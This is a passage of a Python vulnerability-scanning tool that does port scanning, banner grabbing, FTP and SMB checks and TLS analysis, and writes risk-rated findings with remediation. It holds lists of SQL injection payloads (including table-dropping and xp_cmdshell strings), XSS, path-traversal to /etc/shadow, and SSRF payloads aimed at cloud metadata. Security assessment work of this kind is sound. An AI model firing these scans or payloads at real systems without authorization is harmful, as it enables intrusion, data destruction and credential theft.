#!/usr/bin/env python3
"""
Advanced Security Assessment Tool (ASAT) 
Author: Dev Somani
Happy Hacking! 🚀

A multi-phase automated security assessment tool for network, subdomain, and web application testing.
"""

import argparse
import socket
import ssl
import json
import re
import sys
import time
import datetime
import ipaddress
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict
from typing import Dict, List, Tuple, Set, Optional, Any
import warnings
warnings.filterwarnings('ignore')

# Third-party imports
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    import dns.resolver
    import dns.zone
    import dns.query
    from dns.exception import DNSException
    
    import whois
    
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    
    import nmap
    
    from bs4 import BeautifulSoup
    
except ImportError as e:
    print(f"[!] Missing required dependency: {e}")
    print("[!] Please install: pip install python-nmap requests dnspython whois colorama beautifulsoup4")
    sys.exit(1)

# ==================== CONFIGURATION ====================
VERSION = "1.0"
AUTHOR = "Dev Somani"
BANNER = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗ ███████╗ █████╗ ████████╗    ██╗   ██╗██████╗   ║
║    ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝    ██║   ██║██╔══██╗  ║
║    ███████║███████╗███████║   ██║       ██║   █�█████╔╝  ║
║    ██╔══██║╚════██║██╔══██║   ██║       ██║   ██║██╔══██╗  ║
║    ██║  ██║███████║██║  ██║   ██║       ╚██████╔██████╔╝  ║
║    ╚═╝  ╚══════╚═╝  ╚═╝   ╚═╝        ╚═════╝╚═════╝   ║
║                                                              ║
║           Advanced Security Assessment Tool v{VERSION}                ║
║                    Happy Hacking by {AUTHOR}                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
[!] DISCLAIMER: This tool is for authorized security testing only!
[!] Unauthorized use against systems you don't own is illegal!
[!] By using this tool, you agree to use it responsibly and ethically.
{Style.RESET_ALL}
"""

# Color definitions
INFO = Fore.BLUE + "[*]" + Style.RESET_ALL
SUCCESS = Fore.GREEN + "[+]" + Style.RESET_ALL
WARNING = Fore.YELLOW + "[!]" + Style.RESET_ALL
CRITICAL = Fore.RED + "[!!]" + Style.RESET_ALL
PROGRESS = Fore.CYAN + "[>]" + Style.RESET_ALL

# Common subdomains wordlist
SUBDOMAINS_WORDLIST = [
    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
    'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
    'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
    'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
    'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
    'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video',
    'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'pro', 'mail1', 'en', 'id',
    'us', 'ns4', 'www3', 'home', 'apps', 'info', 'tech', 'database', 'stage',
    'monitor', 'storage', 'backup', 'remote', 'server', 'ssh', 'gateway', 'firewall',
    'proxy', 'upload', 'download', 'files', 'assets', 'resources', 'css', 'js',
    'img2', 'images2', 'static2', 'newsletter', 'register', 'login', 'signup',
    'account', 'accounts', 'user', 'users', 'member', 'members', 'profile',
    'profiles', 'dashboard', 'control', 'panel', 'admin2', 'administrator',
    'root', 'super', 'sysadmin', 'manager', 'management', 'operations', 'ops'
]

# Dangerous ports and their services
DANGEROUS_PORTS = {
    21: 'FTP - Anonymous access possible',
    23: 'Telnet - Unencrypted protocol',
    25: 'SMTP - Open relay possible',
    445: 'SMB - Potential for SMB vulnerabilities',
    3389: 'RDP - Remote Desktop Protocol',
    1433: 'MSSQL - Database server',
    3306: 'MySQL - Database server',
    5432: 'PostgreSQL - Database server',
    27017: 'MongoDB - Database server',
    6379: 'Redis - Database server',
    11211: 'Memcached - Cache server',
    9200: 'Elasticsearch - Database server',
    5900: 'VNC - Remote access',
    5800: 'VNC - Remote access (HTTP)',
    161: 'SNMP - Community strings',
    389: 'LDAP - Directory service',
    636: 'LDAPS - Secure LDAP',
    873: 'Rsync - File sync service',
    512: 'Rexec - Remote execution',
    513: 'Rlogin - Remote login',
    514: 'RSH - Remote shell',
    2049: 'NFS - Network File System',
    111: 'RPC - Portmapper',
    135: 'MSRPC - Windows RPC',
    139: 'NetBIOS - File sharing',
    1521: 'Oracle - Database server',
    2483: 'Oracle - Database server',
    2484: 'Oracle - Database server',
    2082: 'cPanel - Control panel',
    2083: 'cPanel SSL - Control panel',
    2086: 'WHM - Control panel',
    2087: 'WHM SSL - Control panel',
    8888: 'Webmin - Control panel',
    10000: 'Webmin - Control panel',
    8443: 'Plesk - Control panel',
    9443: 'Plesk - Control panel'
}

# Common admin panels for detection
ADMIN_PANELS = [
    '/admin', '/administrator', '/admincp', '/adminarea', '/adm', '/adminpanel',
    '/manage', '/manager', '/management', '/dashboard', '/controlpanel', '/cp',
    '/cpanel', '/webadmin', '/sysadmin', '/system', '/backend', '/secure',
    '/wp-admin', '/wp-login.php', '/joomla/administrator', '/drupal/admin',
    '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin', '/mysqladmin',
    '/tomcat-manager', '/manager/html', '/admin/login', '/user/login',
    '/admin/login.php', '/login/admin', '/admin/index.php', '/admin/home',
    '/admin/dashboard', '/admin/panel', '/moderator', '/mod', '/staff'
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' GROUP BY 1--",
    "1' GROUP BY 2--",
    "1' GROUP BY 3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",
    "'; DROP TABLE users--",
    "'; DELETE FROM users--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; EXEC xp_cmdshell('whoami')--"
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "\" onmouseover=\"alert('XSS')\"",
    "';alert('XSS');//"
]

# Path traversal payloads
PATH_TRAVERSAL = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/group",
    "../../../../etc/issue",
    "../../../../etc/motd",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/httpd/access.log",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd"
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://localhost:80",
    "http://localhost:443",
    "http://[::1]:80",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/metadata/instance?api-version=2017-08-01",  # Azure
    "http://metadata.google.internal/",  # GCP
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1"
]

# ==================== UTILITY CLASSES ====================
class Colors:
    """Color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ProgressIndicator:
    """Simple progress indicator for long-running tasks"""
    def __init__(self, total, description="Progress"):
        self.total = total
        self.current = 0
        self.description = description
        self.lock = threading.Lock()
        self.start_time = time.time()
        
    def update(self, amount=1):
        with self.lock:
            self.current += amount
            self._display()
    
    def _display(self):
        percentage = (self.current / self.total) * 100
        elapsed = time.time() - self.start_time
        bar_length = 40
        filled = int(bar_length * self.current // self.total)
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f'\r{PROGRESS} {self.description}: [{bar}] {percentage:.1f}% ({self.current}/{self.total}) - {elapsed:.1f}s')
        sys.stdout.flush()
        if self.current >= self.total:
            print()

class RiskRating:
    """Risk rating classifications"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"
    
    @staticmethod
    def color(rating):
        colors = {
            RiskRating.CRITICAL: Fore.RED + Back.BLACK + Style.BRIGHT,
            RiskRating.HIGH: Fore.RED,
            RiskRating.MEDIUM: Fore.YELLOW,
            RiskRating.LOW: Fore.BLUE,
            RiskRating.INFO: Fore.WHITE
        }
        return colors.get(rating, Fore.WHITE)

class Finding:
    """Class to store individual findings"""
    def __init__(self, title, description, risk_rating, remediation, phase):
        self.title = title
        self.description = description
        self.risk_rating = risk_rating
        self.remediation = remediation
        self.phase = phase
        self.timestamp = datetime.datetime.now().isoformat()
        self.evidence = []
    
    def add_evidence(self, evidence):
        self.evidence.append(evidence)
    
    def to_dict(self):
        return {
            'title': self.title,
            'description': self.description,
            'risk_rating': self.risk_rating,
            'remediation': self.remediation,
            'phase': self.phase,
            'timestamp': self.timestamp,
            'evidence': self.evidence
        }
    
    def __str__(self):
        color = RiskRating.color(self.risk_rating)
        return f"{color}[{self.risk_rating}]{Style.RESET_ALL} {self.title}\n    Description: {self.description}\n    Remediation: {self.remediation}"

class Report:
    """Class to handle report generation"""
    def __init__(self, target):
        self.target = target
        self.start_time = datetime.datetime.now()
        self.findings = []
        self.scan_summary = defaultdict(int)
        
    def add_finding(self, finding):
        self.findings.append(finding)
        self.scan_summary[finding.risk_rating] += 1
    
    def generate_text_report(self):
        """Generate a formatted text report"""
        end_time = datetime.datetime.now()
        duration = end_time - self.start_time
        
        report = []
        report.append("=" * 80)
        report.append(f"SECURITY ASSESSMENT REPORT - {self.target}")
        report.append(f"Scan started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Scan ended: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Total duration: {duration}")
        report.append("=" * 80)
        report.append("\n")
        
        # Executive Summary
        report.append("EXECUTIVE SUMMARY")
        report.append("-" * 40)
        total_findings = len(self.findings)
        report.append(f"Total findings: {total_findings}")
        report.append(f"Critical: {self.scan_summary.get(RiskRating.CRITICAL, 0)}")
        report.append(f"High: {self.scan_summary.get(RiskRating.HIGH, 0)}")
        report.append(f"Medium: {self.scan_summary.get(RiskRating.MEDIUM, 0)}")
        report.append(f"Low: {self.scan_summary.get(RiskRating.LOW, 0)}")
        report.append(f"Info: {self.scan_summary.get(RiskRating.INFO, 0)}")
        report.append("\n")
        
        # Findings by Phase
        phases = ['Network', 'Subdomain', 'Web', 'API', 'Cloud']
        for phase in phases:
            phase_findings = [f for f in self.findings if f.phase == phase]
            if phase_findings:
                report.append(f"\n{phase.upper()} PHASE FINDINGS")
                report.append("-" * 40)
                for finding in phase_findings:
                    color = RiskRating.color(finding.risk_rating)
                    report.append(f"\n{color}[{finding.risk_rating}]{Style.RESET_ALL} {finding.title}")
                    report.append(f"  Description: {finding.description}")
                    if finding.evidence:
                        report.append("  Evidence:")
                        for evidence in finding.evidence[:3]:  # Limit evidence
                            report.append(f"    - {evidence}")
                    report.append(f"  Remediation: {finding.remediation}")
        
        return "\n".join(report)
    
    def generate_json_report(self):
        """Generate JSON report"""
        return json.dumps({
            'target': self.target,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.datetime.now().isoformat(),
            'summary': dict(self.scan_summary),
            'findings': [f.to_dict() for f in self.findings]
        }, indent=2)

# ==================== PHASE 1: NETWORK SCAN ====================
class NetworkScanner:
    """Phase 1: Network reconnaissance and scanning"""
    
    def __init__(self, target, report, verbose=False):
        self.target = re.sub(r'^https?://', '', target).split('/')[0]
        self.report = report
        self.verbose = verbose
        self.resolved_ips = []
        self.open_ports = []
        
    def run(self):
        """Execute all network scan phases"""
        print(f"\n{INFO} Starting Phase 1: Network Scan on {self.target}")
        
        # Host Discovery
        self.host_discovery()
        
        # Port Scanning
        self.port_scan()
        
        # Banner Grabbing
        self.grab_banners()
        
        # Network Information
        self.network_info()
        
        # Vulnerability Checks
        self.vulnerability_checks()
        
        # Firewall Detection
        self.firewall_detection()
        
        # SSL/TLS Cipher Analysis
        self.check_ssl_ciphers()
        
        # DNSSEC Validation
        self.check_dnssec()
        
        # Email Security (SPF/DKIM/DMARC)
        self.check_email_security()
        
        print(f"{SUCCESS} Phase 1 completed")
    
    def host_discovery(self):
        """Discover host and resolve DNS"""
        print(f"\n{INFO} Host Discovery")
        
        try:
            # Resolve hostname to IP
            ip = socket.gethostbyname(self.target)
            self.resolved_ips.append(ip)
            print(f"{SUCCESS} Resolved {self.target} -> {ip}")
            
            # Reverse DNS lookup
            try:
                hostname, _, _ = socket.gethostbyaddr(ip)
                print(f"{SUCCESS} Reverse DNS: {ip} -> {hostname}")
            except:
                print(f"{WARNING} No reverse DNS record found")
            
            # Ping sweep
            print(f"{PROGRESS} Checking if host is alive...")
            response = subprocess.run(['ping', '-c', '1', '-W', '2', ip], 
                                    capture_output=True, text=True)
            if response.returncode == 0:
                print(f"{SUCCESS} Host is alive (responds to ping)")
                finding = Finding(
                    "Host is reachable",
                    f"Target {self.target} ({ip}) responds to ICMP ping",
                    RiskRating.INFO,
                    "N/A - This is informational",
                    "Network"
                )
                self.report.add_finding(finding)
            else:
                print(f"{WARNING} Host does not respond to ping (may be firewalled)")
                
        except socket.gaierror:
            print(f"{CRITICAL} Could not resolve hostname")
            finding = Finding(
                "DNS Resolution Failed",
                f"Could not resolve hostname: {self.target}",
                RiskRating.MEDIUM,
                "Verify the target domain exists and is properly configured",
                "Network"
            )
            self.report.add_finding(finding)
    
    def port_scan(self):
        """Perform comprehensive port scan using nmap"""
        print(f"\n{INFO} Port Scanning (this may take a while...)")
        
        try:
            nm = nmap.PortScanner()
            
            # Progress indicator
            print(f"{PROGRESS} Performing SYN scan on ports 1-65535...")
            
            # Perform SYN scan with version detection and OS fingerprinting
            nm.scan(self.target, arguments='-sS -sV -O -T4 -p 1-65535 --min-rate 1000')
            
            for host in nm.all_hosts():
                print(f"\n{SUCCESS} Host: {host}")
                
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port].get('name', 'unknown')
                        version = nm[host][proto][port].get('version', '')
                        
                        port_info = f"{port}/{proto} - {state} - {service} {version}"
                        
                        if state == 'open':
                            print(f"{SUCCESS} {port_info}")
                            self.open_ports.append({
                                'port': port,
                                'protocol': proto,
                                'service': service,
                                'version': version
                            })
                            
                            # Check if it's a dangerous port
                            if int(port) in DANGEROUS_PORTS:
                                finding = Finding(
                                    f"Dangerous port open: {port}",
                                    f"Port {port} ({service}) is open. This service is known to have security risks.",
                                    RiskRating.HIGH if port in [21,23,445,3389] else RiskRating.MEDIUM,
                                    f"Close the port if not needed. If required, ensure it's properly secured and behind firewall.",
                                    "Network"
                                )
                                finding.add_evidence(f"Service: {service}, Version: {version}")
                                self.report.add_finding(finding)
                                
                        elif state == 'filtered':
                            print(f"{WARNING} {port_info}")
                        else:
                            if self.verbose:
                                print(f"{INFO} {port_info}")
                
                # OS Detection
                if 'osmatch' in nm[host]:
                    for osmatch in nm[host]['osmatch']:
                        print(f"{INFO} OS Detection: {osmatch['name']} ({osmatch['accuracy']}% accuracy)")
                    
        except Exception as e:
            print(f"{WARNING} Port scan failed: {str(e)}")
    
    def grab_banners(self):
        """Grab banners from open ports using raw sockets"""
        print(f"\n{INFO} Banner Grabbing")
        
        for port_info in self.open_ports:
            port = port_info['port']
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, port))
                
                # Send a generic probe
                if port == 80 or port == 443:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                elif port == 21:
                    sock.send(b"HELP\r\n")
                elif port == 25:
                    sock.send(b"HELO test.com\r\n")
                else:
                    sock.send(b"\r\n")
                
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if banner:
                    print(f"{SUCCESS} Banner for port {port}: {banner[:100]}")
                    port_info['banner'] = banner
                    
                    # Check for sensitive information in banner
                    if any(keyword in banner.lower() for keyword in ['root', 'admin', 'password', 'vulnerable']):
                        finding = Finding(
                            f"Sensitive information in banner on port {port}",
                            f"Service banner reveals potentially sensitive information: {banner[:200]}",
                            RiskRating.MEDIUM,
                            "Disable or modify service banners to avoid information disclosure",
                            "Network"
                        )
                        self.report.add_finding(finding)
                        
            except Exception as e:
                if self.verbose:
                    print(f"{WARNING} Could not grab banner from port {port}: {str(e)}")
    
    def network_info(self):
        """Gather network information (WHOIS, GeoIP, Traceroute)"""
        print(f"\n{INFO} Gathering Network Information")
        
        # WHOIS Lookup
        try:
            print(f"{PROGRESS} Performing WHOIS lookup...")
            w = whois.whois(self.target)
            
            print(f"{SUCCESS} WHOIS Information:")
            print(f"  Registrar: {w.registrar}")
            print(f"  Creation Date: {w.creation_date}")
            print(f"  Expiration Date: {w.expiration_date}")
            print(f"  Name Servers: {w.name_servers}")
            
            finding = Finding(
                "WHOIS Information Collected",
                f"Domain registration information gathered",
                RiskRating.INFO,
                "N/A - This is informational",
                "Network"
            )
            finding.add_evidence(f"Registrar: {w.registrar}")
            self.report.add_finding(finding)
            
        except Exception as e:
            print(f"{WARNING} WHOIS lookup failed: {str(e)}")
        
        # GeoIP Lookup (using ip-api.com)
        try:
            print(f"{PROGRESS} Performing GeoIP lookup...")
            response = requests.get(f"http://ip-api.com/json/{self.resolved_ips[0]}", timeout=10)
            if response.status_code == 200:
                geo_data = response.json()
                if geo_data['status'] == 'success':
                    print(f"{SUCCESS} GeoIP Information:")
                    print(f"  Country: {geo_data['country']}")
                    print(f"  Region: {geo_data['regionName']}")
                    print(f"  City: {geo_data['city']}")
                    print(f"  ISP: {geo_data['isp']}")
                    print(f"  Organization: {geo_data['org']}")
                    print(f"  ASN: {geo_data['as']}")
                    
                    finding = Finding(
                        "GeoIP Information",
                        f"Geolocation data for target",
                        RiskRating.INFO,
                        "N/A - This is informational",
                        "Network"
                    )
                    self.report.add_finding(finding)
        except Exception as e:
            print(f"{WARNING} GeoIP lookup failed: {str(e)}")
        
        # Traceroute
        try:
            print(f"{PROGRESS} Performing traceroute...")
            if sys.platform == "win32":
                result = subprocess.run(['tracert', '-h', '15', self.target], 
                                      capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(['traceroute', '-m', '15', self.target], 
                                      capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"{SUCCESS} Traceroute completed (first 5 hops):")
                lines = result.stdout.split('\n')[:5]
                for line in lines:
                    print(f"  {line}")
        except Exception as e:
            print(f"{WARNING} Traceroute failed: {str(e)}")
    
    def vulnerability_checks(self):
        """Perform common vulnerability checks"""
        print(f"\n{INFO} Performing Vulnerability Checks")
        
        for port_info in self.open_ports:
            port = port_info['port']
            service = port_info['service'].lower()
            
            # FTP anonymous login check
            if port == 21 or 'ftp' in service:
                self.check_ftp_anonymous(port_info)
            
            # Telnet check
            if port == 23 or 'telnet' in service:
                finding = Finding(
                    "Telnet Service Exposed",
                    "Telnet transmits data in cleartext and is inherently insecure",
                    RiskRating.HIGH,
                    "Replace Telnet with SSH for secure remote access",
                    "Network"
                )
                self.report.add_finding(finding)
            
            # SMB signing check
            if port == 445 or 'microsoft-ds' in service or 'smb' in service:
                self.check_smb_signing(port_info)
            
            # Default SSH port check
            if port == 22 and 'ssh' in service:
                finding = Finding(
                    "SSH on Default Port",
                    "SSH service running on default port 22",
                    RiskRating.LOW,
                    "Consider moving SSH to a non-standard port to reduce automated attacks",
                    "Network"
                )
                self.report.add_finding(finding)
    
    def check_ftp_anonymous(self, port_info):
        """Check if FTP allows anonymous login"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port_info['port']))
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            
            # Try anonymous login
            sock.send(b"USER anonymous\r\n")
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            
            if '331' in response:  # Password required
                sock.send(b"PASS anonymous@example.com\r\n")
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if '230' in response:  # Login successful
                    print(f"{CRITICAL} FTP anonymous login allowed on port {port_info['port']}")
                    finding = Finding(
                        "FTP Anonymous Access Allowed",
                        f"FTP server on port {port_info['port']} allows anonymous login",
                        RiskRating.HIGH,
                        "Disable anonymous FTP access and implement proper authentication",
                        "Network"
                    )
                    self.report.add_finding(finding)
            
            sock.close()
            
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} FTP anonymous check failed: {str(e)}")
    
    def check_smb_signing(self, port_info):
        """Check if SMB signing is disabled"""
        try:
            # This is a simplified check - in reality would need SMB protocol implementation
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port_info['port']))
            
            # SMB Negotiate Protocol Request (simplified)
            smb_negotiate = (
                b"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x08\x01\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x00"
            )
            sock.send(smb_negotiate)
            response = sock.recv(1024)
            sock.close()
            
            # Check response for signing flags (simplified)
            if response and len(response) > 40:
                if response[39] & 0x08:  # Check if SMB signing is required
                    print(f"{SUCCESS} SMB signing is enabled")
                else:
                    print(f"{CRITICAL} SMB signing appears to be disabled")
                    finding = Finding(
                        "SMB Signing Disabled",
                        f"SMB server on port {port_info['port']} does not require packet signing",
                        RiskRating.HIGH,
                        "Enable SMB signing to prevent man-in-the-middle attacks",
                        "Network"
                    )
                    self.report.add_finding(finding)
                    
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} SMB signing check failed: {str(e)}")
    
    def firewall_detection(self):
        """Detect firewall/IDS presence using nmap techniques"""
        print(f"\n{INFO} Firewall/IDS Detection")
        
        try:
            nm = nmap.PortScanner()
            
            # Use various scan types to detect firewall
            scan_types = [
                ('-sS', 'SYN scan'),
                ('-sT', 'TCP connect scan'),
                ('-sA', 'ACK scan'),
                ('-sW', 'Window scan'),
                ('-sM', 'Maimon scan')
            ]
            
            results = {}
            for scan_type, desc in scan_types:
                nm.scan(self.target, arguments=f'{scan_type} -p 80,443,22 -T4')
                for host in nm.all_hosts():
                    for proto in nm[host].all_protocols():
                        ports = nm[host][proto].keys()
                        for port in ports:
                            state = nm[host][proto][port]['state']
                            if port not in results:
                                results[port] = []
                            results[port].append(state)
            
            # Analyze results for firewall indicators
            firewall_detected = False
            for port, states in results.items():
                if len(set(states)) > 1:  # Different scan types show different states
                    print(f"{WARNING} Potential firewall detected on port {port}: inconsistent states {states}")
                    firewall_detected = True
            
            if firewall_detected:
                finding = Finding(
                    "Firewall/IDS Detected",
                    "Inconsistent port states across different scan types suggest firewall or IDS presence",
                    RiskRating.INFO,
                    "N/A - This information can be used to plan further testing strategies",
                    "Network"
                )
                self.report.add_finding(finding)
            else:
                print(f"{INFO} No obvious firewall/IDS detected")
                
        except Exception as e:
            print(f"{WARNING} Firewall detection failed: {str(e)}")

    def check_ssl_ciphers(self):
        """Analyze SSL/TLS configuration for weak ciphers and protocols"""
        print(f"\n{INFO} SSL/TLS Cipher Analysis")
        
        hostname = self.target
        port = 443
        
        # Weak cipher patterns to detect
        weak_ciphers = {
            'RC4': 'RC4 is broken and should never be used',
            'DES': 'DES is broken (56-bit key) and easily cracked',
            '3DES': 'Triple DES is deprecated due to Sweet32 attack',
            'NULL': 'NULL cipher provides no encryption',
            'EXPORT': 'EXPORT ciphers use intentionally weak keys (40/56-bit)',
            'anon': 'Anonymous ciphers provide no authentication',
            'MD5': 'MD5 for HMAC is deprecated',
        }
        
        # Deprecated protocols to test
        deprecated_protocols = [
            (ssl.PROTOCOL_TLSv1, 'TLSv1.0'),
            (ssl.PROTOCOL_TLSv1_1, 'TLSv1.1'),
        ] if hasattr(ssl, 'PROTOCOL_TLSv1') else []
        
        # Test deprecated protocols
        for protocol_const, protocol_name in deprecated_protocols:
            try:
                context = ssl.SSLContext(protocol_const)
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with socket.create_connection((hostname, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        print(f"{WARNING} Deprecated protocol supported: {protocol_name}")
                        
                        finding = Finding(
                            f"Deprecated TLS Protocol Supported: {protocol_name}",
                            f"The server supports {protocol_name} which has known vulnerabilities "
                            f"(POODLE, BEAST, etc.) and is deprecated by all major browsers.",
                            RiskRating.MEDIUM,
                            f"Disable {protocol_name} on the server. Use TLS 1.2 or TLS 1.3 only.",
                            "Network"
                        )
                        self.report.add_finding(finding)
            except (ssl.SSLError, ConnectionRefusedError, OSError):
                if self.verbose:
                    print(f"{SUCCESS} {protocol_name} is disabled (good)")
            except Exception:
                pass
        
        # Get current cipher suite info using default context
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    tls_version = ssock.version()
                    
                    if cipher:
                        cipher_name = cipher[0]
                        cipher_bits = cipher[2]
                        
                        print(f"{INFO} Negotiated: {tls_version} / {cipher_name} ({cipher_bits}-bit)")
                        
                        # Check for weak cipher
                        for weak_pattern, description in weak_ciphers.items():
                            if weak_pattern.lower() in cipher_name.lower():
                                print(f"{CRITICAL} Weak cipher in use: {cipher_name}")
                                
                                finding = Finding(
                                    f"Weak SSL/TLS Cipher: {cipher_name}",
                                    f"The server negotiated a weak cipher: {cipher_name} ({cipher_bits}-bit). "
                                    f"Reason: {description}.",
                                    RiskRating.HIGH,
                                    "1. Disable all weak ciphers in the server configuration.\n"
                                    "    2. Use only AEAD ciphers (AES-GCM, ChaCha20-Poly1305).\n"
                                    "    3. Follow Mozilla SSL Configuration Generator recommendations.",
                                    "Network"
                                )
                                self.report.add_finding(finding)
                                break
                        
                        # Check for weak key size
                        if cipher_bits < 128:
                            print(f"{WARNING} Weak cipher key size: {cipher_bits}-bit")
                            finding = Finding(
                                "Weak SSL/TLS Key Size",
                                f"Negotiated cipher {cipher_name} uses only {cipher_bits}-bit key, "
                                f"which is below the recommended 128-bit minimum.",
                                RiskRating.HIGH,
                                "Configure the server to require minimum 128-bit cipher key sizes.",
                                "Network"
                            )
                            self.report.add_finding(finding)
                    
                    # Check SSL certificate details
                    cert = ssock.getpeercert()
                    if cert:
                        # Certificate chain validation
                        subject = dict(x[0] for x in cert.get('subject', []))
                        issuer = dict(x[0] for x in cert.get('issuer', []))
                        
                        cn = subject.get('commonName', '')
                        issuer_cn = issuer.get('commonName', '')
                        
                        # Self-signed check
                        if cn == issuer_cn:
                            print(f"{WARNING} Self-signed SSL certificate detected")
                            finding = Finding(
                                "Self-Signed SSL Certificate",
                                f"The SSL certificate is self-signed (CN={cn}, Issuer={issuer_cn}). "
                                f"Self-signed certificates are not trusted by browsers and can facilitate MITM attacks.",
                                RiskRating.MEDIUM,
                                "Use a certificate from a trusted Certificate Authority (CA).",
                                "Network"
                            )
                            self.report.add_finding(finding)
                        
                        # CN mismatch check
                        if cn and hostname not in cn and '*' not in cn:
                            san = cert.get('subjectAltName', [])
                            san_domains = [entry[1] for entry in san if entry[0] == 'DNS']
                            if hostname not in san_domains:
                                print(f"{WARNING} SSL certificate CN mismatch: {cn} != {hostname}")
                                finding = Finding(
                                    "SSL Certificate CN Mismatch",
                                    f"Certificate Common Name '{cn}' does not match hostname '{hostname}'. "
                                    f"This causes browser security warnings and may indicate misconfiguration.",
                                    RiskRating.MEDIUM,
                                    "Ensure the SSL certificate covers the correct hostname(s).",
                                    "Network"
                                )
                                self.report.add_finding(finding)
                                
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} SSL cipher analysis failed: {str(e)}")
    
    def check_dnssec(self):
        """Check if DNSSEC is enabled for the domain"""
        print(f"\n{INFO} Checking DNSSEC Configuration")
        
        try:
            # Query for DNSKEY record
            try:
                dnskey_answers = dns.resolver.resolve(self.target, 'DNSKEY', raise_on_no_answer=False)
                if dnskey_answers and len(dnskey_answers) > 0:
                    print(f"{SUCCESS} DNSSEC is enabled (DNSKEY records found)")
                    
                    finding = Finding(
                        "DNSSEC Enabled",
                        f"DNSSEC is properly configured for {self.target}",
                        RiskRating.INFO,
